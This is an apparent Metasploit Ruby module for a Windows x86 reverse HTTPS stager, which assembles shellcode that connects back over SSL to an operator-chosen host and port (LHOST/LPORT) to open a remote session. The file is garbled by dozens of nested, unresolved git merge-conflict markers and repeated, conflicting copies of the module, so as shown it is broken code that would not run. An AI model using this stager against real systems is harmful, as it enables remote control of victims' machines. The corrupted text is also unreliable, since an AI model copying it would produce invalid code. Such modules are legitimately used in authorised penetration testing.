# -*- coding: binary -*-

require 'msf/core'
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
require 'msf/core/payload/transport_config'
=======
>>>>>>> rapid7/feature/complex-payloads
=======
>>>>>>> origin/feature/complex-payloads
=======
<<<<<<< HEAD
=======
>>>>>>> origin/msf-complex-payloads
=======
require 'msf/core/payload/transport_config'
=======
=======
require 'msf/core/payload/transport_config'
=======
>>>>>>> origin/pod/metasploit-excellent.mp3
>>>>>>> feature/complex-payloads
=======
require 'msf/core/payload/transport_config'
>>>>>>> 4.11.2_release_pre-rails4
<<<<<<< HEAD
>>>>>>> origin/pod/metasploit-api/_index.html
=======
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
>>>>>>> origin/payload-generator.rb
<<<<<<< HEAD
<<<<<<< HEAD
=======
require 'msf/core/payload/transport_config'
>>>>>>> rapid7/master
=======
require 'msf/core/payload/transport_config'
>>>>>>> rapid7/master
=======
>>>>>>> origin/pod/metasploit-api/_index.html
=======
require 'msf/core/payload/transport_config'
>>>>>>> rapid7/master
=======
require 'msf/core/payload/transport_config'
>>>>>>> rapid7/master
=======
require 'msf/core/payload/transport_config'
>>>>>>> rapid7/master
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
>>>>>>> origin/msf-complex-payloads
=======
>>>>>>> origin/msf-complex-payloads
=======
=======
>>>>>>> origin/pod/metasploit-api/_index.html
=======
require 'msf/core/payload/transport_config'
>>>>>>> rapid7/master
=======
require 'msf/core/payload/transport_config'
<<<<<<< HEAD
>>>>>>> master
=======
require 'msf/core/payload/transport_config'
>>>>>>> master
=======
require 'msf/core/payload/transport_config'
>>>>>>> rapid7/master
>>>>>>> origin/payload-generator.rb
=======
>>>>>>> rapid7/master
>>>>>>> msf-complex-payloads
>>>>>>> origin/pod/metasploit-api/_index.html
=======
>>>>>>> origin/pod/metasploit-excellent.mp3
require 'msf/core/payload/windows/reverse_http'

module Msf

<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
=======

>>>>>>> rapid7/feature/complex-payloads
=======

>>>>>>> origin/feature/complex-payloads
=======
<<<<<<< HEAD
=======
>>>>>>> origin/msf-complex-payloads
=======
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
>>>>>>> origin/payload-generator.rb
=======
=======
>>>>>>> origin/pod/metasploit-excellent.mp3
=======

>>>>>>> feature/complex-payloads
=======
>>>>>>> 4.11.2_release_pre-rails4
<<<<<<< HEAD
=======
<<<<<<< HEAD
>>>>>>> origin/pod/metasploit-api/_index.html
<<<<<<< HEAD
<<<<<<< HEAD

=======
>>>>>>> rapid7/master
=======
>>>>>>> rapid7/master
=======
>>>>>>> rapid7/master
=======
>>>>>>> rapid7/master
=======
>>>>>>> rapid7/master
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
>>>>>>> origin/msf-complex-payloads
=======
>>>>>>> origin/msf-complex-payloads
=======
=======
>>>>>>> rapid7/master
=======
>>>>>>> master
=======
>>>>>>> master
=======
>>>>>>> rapid7/master
>>>>>>> origin/payload-generator.rb
=======
>>>>>>> msf-complex-payloads
>>>>>>> origin/pod/metasploit-api/_index.html
=======
>>>>>>> origin/pod/metasploit-excellent.mp3
###
#
# Complex payload generation for Windows ARCH_X86 that speak HTTPS
#
###

<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
=======
>>>>>>> origin/pod/metasploit-api/_index.html
=======
>>>>>>> origin/pod/metasploit-excellent.mp3
module Payload::Windows::ReverseHttps

  include Msf::Payload::TransportConfig
  include Msf::Payload::Windows::ReverseHttp

  #
  # Generate the first stage
  #
  def generate
    super(ssl: true)
  end

  #
  # Generate the transport-specific configuration
  #
  def transport_config(opts={})
    transport_config_reverse_https(opts)
=======
<<<<<<< HEAD
<<<<<<< HEAD
=======
>>>>>>> origin/feature/complex-payloads
=======
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
>>>>>>> origin/msf-complex-payloads
=======
<<<<<<< HEAD
<<<<<<< HEAD
>>>>>>> origin/msf-complex-payloads
=======

=======
>>>>>>> 4.11.2_release_pre-rails4
module Payload::Windows::ReverseHttps

  include Msf::Payload::TransportConfig
  include Msf::Payload::Windows::ReverseHttp

  #
  # Generate the first stage
  #
  def generate
    super(ssl: true)
  end

  #
  # Generate the transport-specific configuration
  #
<<<<<<< HEAD
>>>>>>> origin/pod/metasploit-api/_index.html
=======
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
>>>>>>> origin/payload-generator.rb
=======
>>>>>>> origin/pod/metasploit-api/_index.html

module Payload::Windows::ReverseHttps

  include Msf::Payload::Windows::ReverseHttp

  #
  # Generate and compile the stager
  #
  def generate_reverse_https(opts={})
    combined_asm = %Q^
      cld                    ; Clear the direction flag.
      call start             ; Call start, this pushes the address of 'api_call' onto the stack.
      #{asm_block_api}
      start:
        pop ebp
      #{asm_reverse_http(opts)}
    ^
    Metasm::Shellcode.assemble(Metasm::X86.new, combined_asm).encode_string
  end

  #
  # Generate the first stage
  #
<<<<<<< HEAD
=======
>>>>>>> msf-complex-payloads
>>>>>>> origin/pod/metasploit-api/_index.html
  def generate

    # Generate the simple version of this stager if we don't have enough space
    if self.available_space.nil? || required_space > self.available_space
      return generate_reverse_https(
        host: datastore['LHOST'],
        port: datastore['LPORT'],
        url:  "/" + generate_uri_checksum(Msf::Handler::ReverseHttp::URI_CHECKSUM_INITW),
        ssl:  true)
    end

    conf = {
      ssl:  true,
      host: datastore['LHOST'],
      port: datastore['LPORT'],
      url:  generate_uri,
      exitfunk: datastore['EXITFUNC']
    }

    generate_reverse_https(conf)
<<<<<<< HEAD
=======
<<<<<<< HEAD
=======
  def transport_config(opts={})
    transport_config_reverse_https(opts)
>>>>>>> 4.11.2_release_pre-rails4
=======
>>>>>>> msf-complex-payloads
>>>>>>> origin/pod/metasploit-api/_index.html
  end

  # TODO: Use the CachedSize instead (PR #4894)
  def cached_size
    341
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
>>>>>>> rapid7/feature/complex-payloads
=======
>>>>>>> origin/feature/complex-payloads
=======
=======
>>>>>>> origin/msf-complex-payloads
=======
=======
>>>>>>> feature/complex-payloads
>>>>>>> origin/pod/metasploit-api/_index.html
=======
=======
=======
>>>>>>> rapid7/master
=======
>>>>>>> rapid7/master
<<<<<<< HEAD
>>>>>>> origin/payload-generator.rb
=======
>>>>>>> origin/pod/metasploit-api/_index.html
=======
>>>>>>> rapid7/master
=======
>>>>>>> rapid7/master
<<<<<<< HEAD
=======
>>>>>>> rapid7/master
=======
<<<<<<< HEAD
=======
>>>>>>> master
=======
>>>>>>> master
=======
>>>>>>> origin/payload-generator.rb
>>>>>>> rapid7/master
=======
>>>>>>> origin/pod/metasploit-api/_index.html
=======

=======
>>>>>>> 4.11.2_release_pre-rails4
>>>>>>> origin/pod/metasploit-excellent.mp3
module Payload::Windows::ReverseHttps

  include Msf::Payload::TransportConfig
  include Msf::Payload::Windows::ReverseHttp

  #
  # Generate the first stage
  #
  def generate
    super(ssl: true)
  end

  #
  # Generate the transport-specific configuration
  #
<<<<<<< HEAD
  def generate

    # Generate the simple version of this stager if we don't have enough space
    if self.available_space.nil? || required_space > self.available_space
      return generate_reverse_https(
        host: datastore['LHOST'],
        port: datastore['LPORT'],
        url:  "/" + generate_uri_checksum(Msf::Handler::ReverseHttp::URI_CHECKSUM_INITW),
        ssl:  true)
    end

    conf = {
      ssl:  true,
      host: datastore['LHOST'],
      port: datastore['LPORT'],
      url:  generate_uri,
      exitfunk: datastore['EXITFUNC']
    }

    generate_reverse_https(conf)
=======
  def transport_config(opts={})
    transport_config_reverse_https(opts)
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
=======
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
>>>>>>> origin/payload-generator.rb
>>>>>>> rapid7/master
=======
=======
>>>>>>> origin/pod/metasploit-api/_index.html
>>>>>>> rapid7/master
=======
>>>>>>> rapid7/master
=======
>>>>>>> rapid7/master
=======
>>>>>>> rapid7/master
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
>>>>>>> origin/msf-complex-payloads
=======
>>>>>>> origin/msf-complex-payloads
=======
=======
>>>>>>> rapid7/master
=======
>>>>>>> master
=======
>>>>>>> master
=======
>>>>>>> rapid7/master
>>>>>>> origin/payload-generator.rb
=======
=======
>>>>>>> rapid7/master
>>>>>>> msf-complex-payloads
>>>>>>> origin/pod/metasploit-api/_index.html
=======
>>>>>>> 4.11.2_release_pre-rails4
  end

  # TODO: Use the CachedSize instead (PR #4894)
  def cached_size
    341
>>>>>>> feature/complex-payloads
>>>>>>> origin/pod/metasploit-excellent.mp3
  end

end

end

